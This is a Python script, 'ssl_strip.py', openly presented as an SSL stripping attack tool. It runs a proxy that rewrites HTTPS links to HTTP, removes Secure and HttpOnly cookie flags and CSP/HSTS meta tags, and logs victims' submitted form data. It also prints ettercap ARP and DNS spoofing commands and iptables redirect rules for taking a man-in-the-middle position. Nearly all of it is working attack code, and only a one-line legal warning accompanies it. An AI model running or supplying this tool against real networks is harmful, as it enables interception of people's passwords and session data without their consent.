#!/usr/bin/env python3
"""
ssl_strip.py - SSL Stripping Attack

This script implements an SSL stripping attack to downgrade HTTPS to HTTP
and capture sensitive data in transit.
"""

import socket
import threading
import re
import urllib.parse
import argparse
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import ssl

class SSLStripHandler(BaseHTTPRequestHandler):
    def __init__(self, target_host, *args, **kwargs):
        self.target_host = target_host
        self.captured_data = []
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to control logging"""
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        self.handle_request('GET')
    
    def do_POST(self):
        """Handle POST requests"""
        self.handle_request('POST')
    
    def handle_request(self, method):
        """Handle HTTP requests and strip SSL"""
        try:
            # Get the original request
            path = self.path
            headers = dict(self.headers)
            
            # Read POST data if present
            post_data = None
            if method == 'POST' and 'content-length' in headers:
                content_length = int(headers['content-length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # Log captured form data
                if post_data:
                    print(f"[CAPTURED] POST data from {self.client_address[0]}: {post_data}")
                    self.captured_data.append({
                        'type': 'POST',
                        'client': self.client_address[0],
                        'path': path,
                        'data': post_data,
                        'time': time.strftime('%Y-%m-%d %H:%M:%S')
                    })
            
            # Make request to target over HTTPS
            target_url = f"https://{self.target_host}{path}"
            
            # Prepare headers for upstream request
            upstream_headers = {}
            for key, value in headers.items():
                if key.lower() not in ['host', 'connection']:
                    upstream_headers[key] = value
            
            upstream_headers['Host'] = self.target_host
            
            # Make upstream request
            if method == 'GET':
                response = requests.get(target_url, headers=upstream_headers, verify=False, timeout=10)
            else:
                response = requests.post(target_url, headers=upstream_headers, data=post_data, verify=False, timeout=10)
            
            # Send response back to client
            self.send_response(response.status_code)
            
            # Process response headers and content
            content = response.text
            
            # Strip SSL from the response
            content = self.strip_ssl_from_content(content)
            
            # Send headers
            for key, value in response.headers.items():
                if key.lower() not in ['content-length', 'transfer-encoding', 'connection']:
                    self.send_header(key, value)
            
            self.send_header('Content-Length', len(content.encode('utf-8')))
            self.end_headers()
            
            # Send content
            self.wfile.write(content.encode('utf-8'))
            
        except Exception as e:
            print(f"[ERROR] Request handling error: {e}")
            self.send_error(500, "Internal Server Error")
    
    def strip_ssl_from_content(self, content):
        """Remove HTTPS references from HTML content"""
        try:
            # Replace https:// with http://
            content = re.sub(r'https://', 'http://', content, flags=re.IGNORECASE)
            
            # Replace secure form actions
            content = re.sub(
                r'<form([^>]*?)action=["\']https://([^"\']*?)["\']',
                r'<form\1action="http://\2"',
                content,
                flags=re.IGNORECASE
            )
            
            # Remove secure cookie flags
            content = re.sub(r';\s*secure', '', content, flags=re.IGNORECASE)
            content = re.sub(r';\s*httponly', '', content, flags=re.IGNORECASE)
            
            # Replace mixed content policy
            content = re.sub(
                r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>',
                '',
                content,
                flags=re.IGNORECASE
            )
            
            # Replace HSTS headers
            content = re.sub(
                r'<meta[^>]*http-equiv=["\']Strict-Transport-Security["\'][^>]*>',
                '',
                content,
                flags=re.IGNORECASE
            )
            
            return content
            
        except Exception as e:
            print(f"[ERROR] Content stripping error: {e}")
            return content

class SSLStripAttack:
    def __init__(self, target_host, listen_port=8080):
        self.target_host = target_host
        self.listen_port = listen_port
        self.captured_data = []
        
    def start_server(self):
        """Start the SSL stripping proxy server"""
        print(f"[INFO] Starting SSL Strip attack against {self.target_host}")
        print(f"[INFO] Listening on port {self.listen_port}")
        print(f"[ATTACK] All HTTPS traffic will be downgraded to HTTP")
        print(f"[INFO] Configure target to use this server as HTTP proxy")
        
        # Create custom handler class with target host
        def handler(*args, **kwargs):
            return SSLStripHandler(self.target_host, *args, **kwargs)
        
        httpd = HTTPServer(('0.0.0.0', self.listen_port), handler)
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[INFO] Stopping SSL Strip attack...")
            self.show_captured_data()
        finally:
            httpd.server_close()
    
    def show_captured_data(self):
        """Display captured sensitive data"""
        if not hasattr(self, 'captured_data') or not self.captured_data:
            print("[INFO] No sensitive data captured")
            return
        
        print("\n" + "="*50)
        print("CAPTURED SENSITIVE DATA")
        print("="*50)
        
        for item in self.captured_data:
            print(f"\nTime: {item['time']}")
            print(f"Client: {item['client']}")
            print(f"Path: {item['path']}")
            print(f"Data: {item['data']}")
            print("-" * 30)
    
    def test_ssl_redirect(self):
        """Test if target redirects HTTP to HTTPS"""
        print(f"[TEST] Testing {self.target_host} for HTTP->HTTPS redirects...")
        
        try:
            # Try HTTP connection
            response = requests.get(f"http://{self.target_host}", allow_redirects=False, timeout=10)
            
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('location', '')
                if location.startswith('https://'):
                    print(f"[VULNERABLE] HTTP redirects to HTTPS: {location}")
                    print("[VULNERABLE] SSL stripping attack possible!")
                    return True
            
            # Check for HSTS header
            hsts = response.headers.get('strict-transport-security')
            if hsts:
                print(f"[INFO] HSTS header found: {hsts}")
                print("[PROTECTED] HSTS may prevent SSL stripping")
                return False
            
            print("[INFO] No HTTP to HTTPS redirect found")
            return False
            
        except Exception as e:
            print(f"[ERROR] Testing error: {e}")
            return False

def dns_spoof_setup():
    """Provide instructions for DNS spoofing setup"""
    print("\n" + "="*50)
    print("SSL STRIP ATTACK SETUP")
    print("="*50)
    print("To perform a complete SSL strip attack, you need to:")
    print()
    print("1. Position yourself as a man-in-the-middle (same network)")
    print("2. Redirect victim's traffic to your proxy:")
    print("   - Use ARP spoofing: ettercap -T -M arp:remote /target_ip/ /gateway_ip/")
    print("   - Or DNS spoofing: ettercap -T -M dns:remote /target_domain/proxy_ip/")
    print("3. Start this SSL strip proxy")
    print("4. Use iptables to redirect traffic:")
    print("   iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
    print("   iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
    print()
    print("LEGAL WARNING: Only use on networks you own or have permission to test!")

def main():
    parser = argparse.ArgumentParser(description='SSL Stripping Attack Tool')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Listen port (default: 8080)')
    parser.add_argument('-t', '--test', action='store_true', help='Test for vulnerability only')
    parser.add_argument('--setup', action='store_true', help='Show setup instructions')
    
    args = parser.parse_args()
    
    print("SSL Stripping Attack Tool")
    print("=========================")
    
    if args.setup:
        dns_spoof_setup()
        return
    
    attacker = SSLStripAttack(args.target, args.port)
    
    if args.test:
        is_vulnerable = attacker.test_ssl_redirect()
        if is_vulnerable:
            print("\n[INFO] Use without --test flag to start attack")
            print("[INFO] Use --setup flag for attack setup instructions")
    else:
        print("[INFO] Testing for SSL redirect first...")
        is_vulnerable = attacker.test_ssl_redirect()
        
        if is_vulnerable:
            print("\n[ATTACK] Target appears vulnerable! Starting SSL strip server...")
            time.sleep(2)
            attacker.start_server()
        else:
            print("\n[INFO] Target may not be vulnerable to SSL stripping")
            response = input("Start attack anyway? (y/N): ")
            if response.lower() == 'y':
                attacker.start_server()

if __name__ == "__main__":
    main()